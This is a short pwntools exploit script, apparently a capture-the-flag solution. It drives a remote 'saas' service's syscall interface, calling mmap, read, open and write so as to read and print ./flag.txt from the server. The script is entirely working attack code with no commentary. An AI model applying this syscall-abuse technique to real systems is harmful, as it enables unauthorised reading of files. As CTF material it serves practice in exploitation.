from pwn import *

def syscall(rax,rdi,rsi,rdx,r10,r9,r8):
    p.recvuntil("(decimal): ")
    p.sendline(str(rax))
    p.recvuntil("(decimal): ")
    p.sendline(str(rdi))
    p.recvuntil("(decimal): ")
    p.sendline(str(rsi))
    p.recvuntil("(decimal): ")
    p.sendline(str(rdx))
    p.recvuntil("(decimal): ")
    p.sendline(str(r10))
    p.recvuntil("(decimal): ")
    p.sendline(str(r9))
    p.recvuntil("(decimal): ")
    p.sendline(str(r8))


#p=process("./saas")
p = remote("jh2i.com",50016)

syscall(9,0x400000,50,3,34,0,0xFFFFFFFF)

syscall(0,0,0x400000,15,0,0,0)

p.sendline("./flag.txt\x00")
syscall(2,0x400000,0,0,0,0,0)

syscall(0,6,0x400000,50,0,0,0)
syscall(1,1,0x400000,50,0,0,0)
p.interactive()
